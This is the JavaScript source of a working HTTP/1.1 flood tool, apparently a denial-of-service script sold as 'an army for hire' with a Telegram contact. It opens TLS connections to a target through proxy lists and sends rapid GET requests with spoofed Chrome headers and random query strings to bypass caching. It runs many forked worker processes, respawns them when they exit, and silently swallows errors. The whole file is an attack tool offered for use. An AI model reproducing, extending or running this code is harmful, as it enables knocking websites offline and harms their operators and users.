
const crypto = require("crypto");
const net = require('net');
const tls = require('tls');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const colors = require('colors');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        //console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        //console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

    const statusesQ = []
    let statuses = {}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('')
    console.log(colors.cyan("https://t.me/mkrakh"));
    console.log(`
    ${`${'HTTP1 v1.0 flood'.underline} | Updated header system, custom TLS version, randrate support.`.italic}

    ${'Usage:'.bold.underline}

        ${`node mkra.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node HTTP1.js https://google.com 300 5 90 proxy.txt --debug true --query 1'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Debug level response codes`.italic}
        --query         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Generate query [1: ?q=wsqd], [2: ?wsqd]'.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --filter        ${'true'.green}        ${'-'.red.bold}   ${'Remove unresponsive proxies from list'.italic}
        --tls           ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`TLS max version [1: ${'TLSv1'.underline}], [2: ${'TLSv2'.underline}], [3: ${'TLSv3'.underline}]`.italic}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

var parsed = url.parse(target);

if (!proxyfile) { error("Invalid proxy file!")}
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!") }

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--query', value: get_option('--query') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--filter', value: get_option('--filter') },
    { flag: '--tls', value: get_option('--tls') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function random_ua() {
    const versions = ["120:8", "121:99", "122:24", "123:8", "124:99"];
    const version = versions[Math.floor(Math.random() * versions.length)].split(":");
    const user_agents = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version[0]}.0.0.0 Safari/537.36`;
    const sec_ch_ua = `\"Not_A Brand\";v=\"${version[1]}\", \"Chromium\";v=\"${version[0]}\", \"Google Chrome\";v=\"${version[0]}\"`;
    let header = {
        ua: user_agents,
        ch_ua: sec_ch_ua,
    };
    return header;
}

function attack() {

    const [proxyHost, proxyPort] = proxies[~~(Math.random() * proxies.length)].split(':');
    let SocketTLS;

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        var tls_version = enabled('tls');
        if (tls_version) {
            switch (tls_version) {
                case 1:
                    tls_version = 'TLSv1.1';
                    break;
                case 2:
                    tls_version = 'TLSv1.2';
                    break;
                case 3:
                    tls_version = 'TLSv1.3';
                    break;
                default:
                    tls_version = 'TLSv1.3'; //default
                    break;
            }
        } else {
            tls_version = 'TLSv1.3'; //default
        }

        netSocket.once('data', () => {
            SocketTLS = tls.connect({
                host: parsed.host,
                ciphers: ciphers,
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                servername: parsed.host,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.1',
                maxVersion: tls_version,
                ALPNProtocols: ['http/1.1'],
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                socket: netSocket,
            }, async () => {
                SocketTLS.allowHalfOpen = true;
                SocketTLS.setNoDelay(true);
                SocketTLS.setKeepAlive(true, 10000);
                SocketTLS.setMaxListeners(0);

                let ratelimit;

                if (enabled('randrate')) {
                    ratelimit = random_int(1, 90);
                } else {
                    ratelimit = rate;
                }

                function request() {
                    let header = random_ua();
                    let query;
                    if (enabled('query')) {
                        switch (enabled('query')) {
                            case 1:
                                query = `?q=${random_string(Math.floor(Math.random() * 7) + 2)}`
                                break;
                            case 2:
                                query = `?${random_string(Math.floor(Math.random() * 7) + 2)}`
                                break;
                            default:
                                break
                        }
                    }

                    let method = 'GET';

                    if (enabled('debug') === 1) {
                        method = 'HEAD';
                    }

                    let http1Payload = `${method} ${parsed.path}${query} HTTP/1.1\r\n` +
                    `Host: ${parsed.host}\r\n` +
                    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n` +
                    `User-Agent: ${header.ua}\r\n` +
                    `Upgrade-Insecure-Requests: 1\r\n` +
                    `Accept-Encoding: gzip, deflate, br\r\n` +
                    `Accept-Language: en-US,en;q=0.9\r\n` +
                    //Math.random() < 0.5 ? "Cache-Control: max-age=0\r\n" : "" +
                    `Sec-Ch-Ua: ${header.ch_ua}\r\n` +
                    'Sec-Ch-Ua-Mobile: ?0\r\n' + 
                    'Sec-Ch-Ua-Platform: \"Windows\"\r\n' + 
                    'Sec-Fetch-Dest: document\r\n' +
                    'Sec-Fetch-Mode: navigate\r\n' +
                    'Sec-Fetch-Site: none\r\n' + 
                    'Sec-Fetch-User ?1\r\n' +
                    `Connection: Keep-Alive\r\n\r\n`;
                    SocketTLS.write(http1Payload, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                request()
                            }, 1000 / ratelimit)
                        } else {
                            SocketTLS.end(() => SocketTLS.destroy());
                        }
                    })
                }

                request()

                SocketTLS.on('data', (chunk) => {
                    if (enabled('debug')) {
                        const response = chunk.toString('utf-8');
                        const sections = response.split('\r\n');
                        const statusLine = sections[0];
                        const status = statusLine.split(' ')[1];
                        if (!isNaN(status)) {
                            if (!statuses[status])
                                statuses[status] = 0
        
                            statuses[status]++
                        }
                    }
                })

                SocketTLS.on('error', () => {
                    SocketTLS.end(() => SocketTLS.destroy())
                })

                SocketTLS.on('end', () => {
                    SocketTLS.destroy();
                });

                return
            })
        })

        netSocket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => {}).once('close', () => {
        if (SocketTLS) {
            SocketTLS.end(() => { SocketTLS.destroy(); attack() })
        }
    })
}

if (cluster.isMaster) {

    const workers = {}

    let _options = ""
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('')
    console.log(colors.cyan("                   https://t.me/mkrakh"));
    console.log(`
            ${'Method'.bold}      ${'-'.red}   ${'['.red} ${`HTTP1`.italic} ${']'.red} 
            ${'Target'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
            ${'Time'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'Threads'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'Rate'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
            ${'Options'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (enabled('debug')) {
        setInterval(() => {
            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0
    
                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(`(${colors.underline(new Date().toLocaleString('us'))}) [${colors.red('status')}] | ${colors.bold(statuses)}`)
        }, 1000)
    }

} else {
    if (enabled('debug')) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()
    
            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }
    setInterval(attack);
    setTimeout(() => process.exit(1), duration * 1000);
}